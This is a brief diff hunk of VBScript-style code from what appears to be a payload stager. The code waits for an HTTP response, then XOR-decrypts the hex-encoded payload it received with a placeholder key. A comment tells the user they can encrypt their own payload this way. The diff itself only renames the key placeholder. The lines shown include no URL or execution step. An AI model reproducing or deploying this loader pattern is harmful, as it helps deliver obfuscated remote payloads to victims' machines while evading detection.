@@ -7,7 +7,7 @@ while(Len(b) = 0):
 	
 	b = a.responseText:
 wend:
-k="DECRYPT_PASSWORD":
+k="DECRYPT_KEY":
 for i = 0 to Len(b) - 1 Step 2:
 	c = c & Chr(Asc(Chr("&H" & Mid(b, i + 1, 2))) xor Asc(Mid(k, ((i / 2)mod Len(k)) + 1, 1))):
 	' You can encrypt your payload as like
